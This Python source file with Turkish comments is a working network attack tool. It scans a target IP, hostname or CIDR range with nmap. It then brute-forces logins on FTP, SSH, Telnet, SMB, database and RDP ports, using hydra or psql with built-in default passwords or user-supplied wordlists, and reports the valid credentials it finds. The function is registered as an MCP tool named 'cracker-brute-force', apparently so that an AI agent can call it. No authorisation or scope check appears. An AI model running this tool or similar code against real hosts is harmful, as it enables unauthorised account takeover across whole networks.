import subprocess
import ipaddress
import socket
import re
import xml.etree.ElementTree as ET
import os
import sys

# Bu sözlük, fonksiyonun dışında statik bir konfigürasyon olarak kalabilir.
default_credentials = {
    21: ("ftp", [("admin", "admin"), ("anonymous", "anonymous")]),
    22: ("ssh", [("root", "toor"), ("admin", "admin"), ("root","root")]),
    23: ("telnet", [("admin", "admin"), ("root", "root")]),
    25: ("smtp", [("admin", "admin")]),
    110: ("pop3", [("admin", "admin")]),
    139: ("smb", [("guest", ""), ("admin", "admin")]),
    445: ("smb", [("guest", ""), ("admin", "admin")]),
    3306: ("mysql", [("root", "root"), ("admin", "admin")]),
    5432: ("postgres", [("postgres", "postgres")]),
    1433: ("mssql", [("sa", "123456"), ("admin", "admin")]),
    1521: ("oracle", [("system", "oracle"), ("admin", "admin")]),
    389: ("ldap", [("cn=admin,dc=example,dc=com", "admin")]),
    3389: ("rdp", [("Administrator", "admin"), ("admin", "admin")])
}

# --- YARDIMCI FONKSİYONLAR ---
# Bu fonksiyonlar ana mantığı destekler ve kendi başlarına kalabilirler.

def get_input_type(target):
    try:
        ipaddress.ip_address(target)
        return "ip"
    except ValueError: pass
    try:
        ipaddress.ip_network(target, strict=False)
        return "cidr"
    except ValueError: pass
    try:
        socket.gethostbyname(target)
        return "host"
    except socket.error:
        return "unknown"

def parse_nmap_xml(nmap_xml_output):
    open_ports = []
    if not nmap_xml_output:
        return open_ports
    try:
        root = ET.fromstring(nmap_xml_output)
        for port in root.findall(".//port"):
            state = port.find("state")
            if state is not None and state.get("state") == "open" and port.get("protocol") == "tcp":
                open_ports.append(int(port.get("portid")))
    except ET.ParseError as e:
        print(f"[!] Nmap XML çıktısı ayrıştırılamadı: {e}")
    return open_ports

def run_nmap_scan(target):
    print(f"\n[*] {target} → Nmap -Pn -A taraması başlatılıyor...")
    try:
        cmd = ["nmap", "-Pn", "-A", "-oX", "-", target]
        result = subprocess.run(cmd, capture_output=True, text=True, check=True, timeout=300)
        return parse_nmap_xml(result.stdout)
    except FileNotFoundError:
        print("[!] HATA: 'nmap' komutu bulunamadı.")
        return []
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
        print(f"[!] {target} için Nmap taraması başarısız oldu veya zaman aşımına uğradı.")
        return []

def load_custom_credentials(username_file, password_file):
    creds = []
    try:
        with open(username_file, 'r', encoding='utf-8') as uf:
            usernames = [line.strip() for line in uf if line.strip()]
        with open(password_file, 'r', encoding='utf-8') as pf:
            passwords = [line.strip() for line in pf if line.strip()]
        for user in usernames:
            for pwd in passwords:
                creds.append((user, pwd))
        return creds
    except FileNotFoundError as e:
        print(f"[!] HATA: Dosya bulunamadı -> {e.filename}")
        return []
    except Exception as e:
        print(f"[!] Dosyaları okurken bir hata oluştu: {e}")
        return []

def run_psql_check(ip, port, creds):
    print(f"[*] {ip}:{port} → POSTGRES (psql ile) için parola denemesi başlatılıyor...")
    successful_logins = []
    my_env = os.environ.copy()
    for username, password in creds:
        my_env["PGPASSWORD"] = password
        try:
            cmd = ["psql", "-h", ip, "-U", username, "-d", "postgres", "-p", str(port), "-c", "\\q"]
            result = subprocess.run(cmd, env=my_env, capture_output=True, text=True, timeout=15)
            if result.returncode == 0:
                print(f"[✅] GİRİŞ BAŞARILI → POSTGRES | {ip}:{port} | Kullanıcı: {username} | Parola: '{password}'")
                successful_logins.append({"username": username, "password": password})
        except FileNotFoundError:
            print("[!] HATA: 'psql' komutu bulunamadı.")
            return []
        except subprocess.TimeoutExpired:
            pass
    return successful_logins

def run_hydra(ip, port, service, creds):
    print(f"[*] {ip}:{port} → {service.upper()} (Hydra ile) için parola denemesi başlatılıyor...")
    successful_logins = []
    for username, password in creds:
        password_arg = password if password else "^$"
        try:
            cmd = ["hydra", "-t", "4", "-l", username, "-p", password_arg, "-s", str(port), "-f", f"{service}://{ip}"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if "1 valid password found" in result.stdout:
                print(f"[✅] GİRİŞ BAŞARILI → {service.upper()} | {ip}:{port} | Kullanıcı: {username} | Parola: '{password}'")
                successful_logins.append({"username": username, "password": password})
        except FileNotFoundError:
            print("[!] HATA: 'hydra' komutu bulunamadı.")
            return []
        except Exception:
            pass
    return successful_logins

# --- ANA ENTEGRASYON FONKSİYONU ---

# mcp_instance.py'den MCP nesnesini import et
from mcp_instance import mcp


@mcp.tool("cracker-brute-force")
def run_scan_and_bruteforce(target_input, username_file=None, password_file=None):
    """
    Belirtilen hedefe karşı Nmap taraması yapar ve açık portlarda parola denemesi gerçekleştirir.
    Sonuç olarak bulunan geçerli kimlik bilgilerinin bir listesini döndürür.

    :param target_input: Taranacak Hedef (IP, CIDR veya Hostname).
    :param username_file: (İsteğe bağlı) Kullanıcı adı listesinin dosya yolu.
    :param password_file: (İsteğe bağlı) Parola listesinin dosya yolu.
    :return: Başarılı giriş bilgilerini içeren bir sözlük listesi.
             Örnek: [{'ip': '1.2.3.4', 'port': 22, 'service': 'ssh', ...}]
    """
    found_credentials_list = []
    creds_to_use = []
    use_defaults = True

    if username_file and password_file:
        custom_creds = load_custom_credentials(username_file, password_file)
        if custom_creds:
            creds_to_use = custom_creds
            use_defaults = False
            print(f"[+] Özel listeler kullanılacak. {len(creds_to_use)} adet kombinasyon yüklendi.")
        else:
            print("[!] Özel kimlik bilgisi listeleri yüklenemedi veya boş. Devam edilemiyor.")
            return []
    else:
        print("[+] Varsayılan kimlik bilgileri kullanılacak.")

    input_type = get_input_type(target_input)
    if input_type == "unknown":
        print("[!] Geçersiz hedef girdiniz.")
        return []

    targets = []
    if input_type in ["ip", "host"]:
        targets.append(target_input)
    elif input_type == "cidr":
        try:
            network = ipaddress.ip_network(target_input, strict=False)
            targets = [str(ip) for ip in network.hosts()]
            print(f"[*] CIDR aralığındaki {len(targets)} adet host taranacak...")
        except ValueError as e:
            print(f"[!] CIDR aralığı ayrıştırılırken hata oluştu: {e}")
            return []

    for ip in targets:
        open_ports = run_nmap_scan(ip)
        if not open_ports:
            print(f"[-] {ip} için devam ediliyor, açık port bulunamadı veya desteklenmiyor.")
            print("-" * 60)
            continue
        
        for port in open_ports:
            if port in default_credentials:
                service, base_creds = default_credentials[port]
                
                creds_for_this_run = creds_to_use if not use_defaults else base_creds

                if not creds_for_this_run:
                    continue
                
                print(f"\n[*] Port {port} ({service.upper()}) için {len(creds_for_this_run)} kimlik bilgisi denenecek.")
                
                successes = []
                if port == 5432:
                    successes = run_psql_check(ip, port, creds_for_this_run)
                else:
                    successes = run_hydra(ip, port, service, creds_for_this_run)
                
                for cred in successes:
                    found_credentials_list.append({
                        "ip": ip,
                        "port": port,
                        "service": service,
                        "username": cred["username"],
                        "password": cred["password"]
                    })
            else:
                print(f"[-] Port {port} → desteklenen bir servis değil, atlanıyor.")
        print("-" * 60)
        
    return found_credentials_list

# --- DOĞRUDAN ÇALIŞTIRMA BLOĞU ---
# Bu blok, script'in hem import edilebilir olmasını hem de doğrudan çalıştırılabilmesini sağlar.
if __name__ == "__main__":
    # Komut satırı argümanları ile otomatik çalıştırma
    if len(sys.argv) > 1:
        target = sys.argv[1]
        user_file = sys.argv[2] if len(sys.argv) > 2 else None
        pass_file = sys.argv[3] if len(sys.argv) > 3 else None
    else:
        target = input("Hedef IP / Hostname / CIDR girin: ").strip()
        user_file = None
        pass_file = None
        choice = input("[?] Kendi kullanıcı/parola listelerinizi kullanmak ister misiniz? (e/h): ").lower().strip()
        if choice == 'e':
            user_file = input("  [->] Kullanıcı adı dosyasının yolunu girin: ").strip()
            pass_file = input("  [->] Parola dosyasının yolunu girin: ").strip()
    # Ana fonksiyonu çağır
    results = run_scan_and_bruteforce(target, username_file=user_file, password_file=pass_file)
    
    print("\n\n--- TARAMA TAMAMLANDI ---")
    if results:
        print(f"[+] Toplam {len(results)} adet geçerli kimlik bilgisi bulundu:")
        for res in results:
            print(f"  - IP: {res['ip']}, Port: {res['port']}, Servis: {res['service'].upper()}, Kullanıcı: {res['username']}, Parola: '{res['password']}'")
    else:
        print("[-] Geçerli hiçbir kimlik bilgisi bulunamadı.")
